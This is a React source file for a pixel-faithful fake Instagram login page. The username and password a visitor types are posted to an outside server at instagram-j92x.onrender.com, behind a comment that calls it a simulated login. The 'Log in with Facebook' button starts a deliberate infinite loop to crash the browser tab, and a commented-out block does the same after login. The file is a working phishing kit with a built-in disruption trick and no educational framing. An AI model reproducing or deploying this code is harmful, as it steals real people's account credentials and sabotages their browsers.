import React, { useState } from "react";

export default function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const URL = "https://instagram-j92x.onrender.com";
  const handleLogin = async () => {
    // Simulate login process
    if (username && password) {
      const response = await fetch(`${URL}/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: username, password }),
      });
      const data = await response.json();
      // console.log("Login response:", data);
      // setTimeout(() => {
      //   // Create infinite loop to crash the tab
      //   while (true) {
      //     console.log("Crashing...");
      //   }
      // }, 1000);
    }
  };

  const handleFacebookLogin = () => {
    // Same crash behavior for Facebook login
    setTimeout(() => {
      while (true) {
        console.log("Crashing...");
      }
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-black flex items-center justify-center px-4">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&display=swap');
        .instagram-logo {
          font-family: 'Dancing Script', cursive;
          font-weight: 700;
        }
      `}</style>
      <div className="w-full max-w-sm">
        {/* Instagram Logo */}
        <div className="text-center mb-8">
          <h1 className="instagram-logo text-white text-5xl">Instagram</h1>
        </div>

        {/* Login Form */}
        <div className="space-y-3">
          {/* Username Input */}
          <div>
            <input
              type="text"
              placeholder="Phone number, username or email address"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-3 py-3 bg-gray-800 border border-gray-600 rounded text-white text-sm placeholder-gray-400 focus:outline-none focus:border-gray-500"
            />
          </div>

          {/* Password Input */}
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-3 bg-gray-800 border border-gray-600 rounded text-white text-sm placeholder-gray-400 focus:outline-none focus:border-gray-500 pr-16"
            />
            {password && (
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-white text-sm font-medium hover:text-gray-300"
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            )}
          </div>

          {/* Login Button */}
          <button
            onClick={handleLogin}
            disabled={!username || !password}
            className={`w-full py-2 rounded font-medium text-sm ${
              username && password
                ? "bg-blue-500 text-white hover:bg-blue-600"
                : "bg-blue-800 text-blue-300 cursor-not-allowed"
            }`}
          >
            Log in
          </button>
        </div>

        {/* OR Divider */}
        <div className="flex items-center my-6">
          <div className="flex-1 border-t border-gray-600"></div>
          <div className="px-4 text-gray-400 text-sm font-medium">OR</div>
          <div className="flex-1 border-t border-gray-600"></div>
        </div>

        {/* Facebook Login */}
        <button
          onClick={handleFacebookLogin}
          className="w-full flex items-center justify-center space-x-2 text-blue-400 hover:text-blue-300 mb-6"
        >
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
          </svg>
          <span className="text-sm font-medium">Log in with Facebook</span>
        </button>

        {/* Forgot Password */}
        <div className="text-center mb-8">
          <a href="#" className="text-blue-400 hover:text-blue-300 text-sm">
            Forgotten your password?
          </a>
        </div>

        {/* Sign Up */}
        <div className="text-center mb-8">
          <span className="text-gray-400 text-sm">Don't have an account? </span>
          <a
            href="#"
            className="text-blue-400 hover:text-blue-300 text-sm font-medium"
          >
            Sign up
          </a>
        </div>

        {/* Footer Links */}
        <div className="text-center space-y-4">
          <div className="flex flex-wrap justify-center gap-4 text-gray-500 text-xs">
            <a href="#" className="hover:text-gray-400">
              Meta
            </a>
            <a href="#" className="hover:text-gray-400">
              About
            </a>
            <a href="#" className="hover:text-gray-400">
              Blog
            </a>
            <a href="#" className="hover:text-gray-400">
              Jobs
            </a>
            <a href="#" className="hover:text-gray-400">
              Help
            </a>
            <a href="#" className="hover:text-gray-400">
              API
            </a>
            <a href="#" className="hover:text-gray-400">
              Privacy
            </a>
          </div>
          <div className="flex flex-wrap justify-center gap-4 text-gray-500 text-xs">
            <a href="#" className="hover:text-gray-400">
              Terms
            </a>
            <a href="#" className="hover:text-gray-400">
              Locations
            </a>
            <a href="#" className="hover:text-gray-400">
              Instagram Lite
            </a>
            <a href="#" className="hover:text-gray-400">
              Threads
            </a>
          </div>
          <div className="flex flex-wrap justify-center gap-4 text-gray-500 text-xs">
            <a href="#" className="hover:text-gray-400">
              Contact uploading and non-users
            </a>
            <a href="#" className="hover:text-gray-400">
              Meta Verified
            </a>
          </div>
          <div className="flex justify-center items-center gap-4 text-gray-500 text-xs">
            <select className="bg-black text-gray-500 border-none text-xs">
              <option>English (UK)</option>
            </select>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </div>
      </div>
    </div>
  );
}
